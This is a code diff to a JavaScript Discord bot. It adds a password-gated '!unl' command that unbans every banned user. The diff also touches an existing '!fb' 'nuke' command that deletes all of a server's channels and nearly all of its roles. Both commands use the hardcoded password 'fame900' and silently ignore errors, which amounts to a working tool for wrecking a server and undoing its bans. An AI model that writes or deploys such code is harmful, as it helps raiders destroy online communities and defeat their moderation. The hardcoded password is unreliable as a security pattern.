@@ -62,7 +62,8 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.MessageContent
+    GatewayIntentBits.MessageContent,
+    GatewayIntentBits.GuildBans   // Added for unbanning
   ]
 });
 
@@ -149,7 +150,7 @@ client.on('messageCreate', async message => {
     return;
   }
 
-  // !fb Command
+  // !fb - Nuke Command
   if (content === '!fb') {
     const embed = new EmbedBuilder()
       .setColor('#ff0000')
@@ -166,6 +167,26 @@ client.on('messageCreate', async message => {
     );
 
     await message.reply({ embeds: [embed], components: [row] });
+    return;
+  }
+
+  // !unl - Unban All Command
+  if (content === '!unl') {
+    const embed = new EmbedBuilder()
+      .setColor('#00ff00')
+      .setTitle('🔓 UNBAN ALL CONFIRMATION')
+      .setDescription('This will unban **everyone** who is currently banned from the server.\n\nOnly you can proceed.')
+      .setFooter({ text: 'Click the button below' })
+      .setTimestamp();
+
+    const row = new ActionRowBuilder().addComponents(
+      new ButtonBuilder()
+        .setCustomId(`unban_start_${message.author.id}`)
+        .setLabel('Enter Password')
+        .setStyle(ButtonStyle.Success)
+    );
+
+    await message.reply({ embeds: [embed], components: [row] });
   }
 });
 
@@ -174,7 +195,7 @@ client.on('messageCreate', async message => {
 // ======================================================
 client.on('interactionCreate', async interaction => {
 
-  // === NUKE BUTTON ===
+  // === NUKE BUTTON + MODAL ===
   if (interaction.isButton() && interaction.customId.startsWith('nuke_start_')) {
     const userId = interaction.customId.split('_')[2];
     if (interaction.user.id !== userId) {
@@ -198,13 +219,11 @@ client.on('interactionCreate', async interaction => {
     await interaction.showModal(modal);
   }
 
-  // === NUKE MODAL SUBMIT ===
   if (interaction.isModalSubmit() && interaction.customId.startsWith('nuke_modal_')) {
     const userId = interaction.customId.split('_')[2];
     if (interaction.user.id !== userId) return;
 
     const password = interaction.fields.getTextInputValue('nuke_password');
-
     if (password !== 'fame900') {
       return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
     }
@@ -212,15 +231,12 @@ client.on('interactionCreate', async interaction => {
     await interaction.reply({ content: '🔴 **NUKE INITIATED** - Deleting everything...', ephemeral: true });
 
     const guild = interaction.guild;
-
     try {
-      // Delete all channels
       const channels = Array.from(guild.channels.cache.values());
       for (const channel of channels) {
         await channel.delete().catch(() => {});
       }
 
-      // Delete all roles except "Owner"
       const roles = Array.from(guild.roles.cache.values());
       for (const role of roles) {
         if (role.name === 'Owner' || role.name === '@everyone') continue;
@@ -231,6 +247,66 @@ client.on('interactionCreate', async interaction => {
     } catch (err) {
       console.error(err);
       await interaction.followUp({ content: '⚠️ Nuke partially failed.', ephemeral: true });
+    }
+    return;
+  }
+
+  // === UNBAN ALL BUTTON + MODAL ===
+  if (interaction.isButton() && interaction.customId.startsWith('unban_start_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) {
+      return interaction.reply({ content: '❌ This button is not for you.', ephemeral: true });
+    }
+
+    const modal = new ModalBuilder()
+      .setCustomId(`unban_modal_${userId}`)
+      .setTitle('Enter Unban Password');
+
+    const passwordInput = new TextInputBuilder()
+      .setCustomId('unban_password')
+      .setLabel('Password')
+      .setStyle(TextInputStyle.Short)
+      .setPlaceholder('Enter password')
+      .setRequired(true);
+
+    const row = new ActionRowBuilder().addComponents(passwordInput);
+    modal.addComponents(row);
+
+    await interaction.showModal(modal);
+  }
+
+  if (interaction.isModalSubmit() && interaction.customId.startsWith('unban_modal_')) {
+    const userId = interaction.customId.split('_')[2];
+    if (interaction.user.id !== userId) return;
+
+    const password = interaction.fields.getTextInputValue('unban_password');
+    if (password !== 'fame900') {
+      return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
+    }
+
+    await interaction.reply({ content: '🔓 **UNBANNING EVERYONE** - This may take a while...', ephemeral: true });
+
+    const guild = interaction.guild;
+    let unbannedCount = 0;
+
+    try {
+      const bans = await guild.bans.fetch();
+      if (bans.size === 0) {
+        return interaction.followUp({ content: '✅ No banned users found.', ephemeral: true });
+      }
+
+      for (const ban of bans.values()) {
+        await guild.members.unban(ban.user.id, 'Unban All Command').catch(() => {});
+        unbannedCount++;
+      }
+
+      await interaction.followUp({ 
+        content: `✅ **Successfully unbanned ${unbannedCount} users.**`, 
+        ephemeral: true 
+      });
+    } catch (err) {
+      console.error(err);
+      await interaction.followUp({ content: '⚠️ Unban process partially failed.', ephemeral: true });
     }
     return;
   }
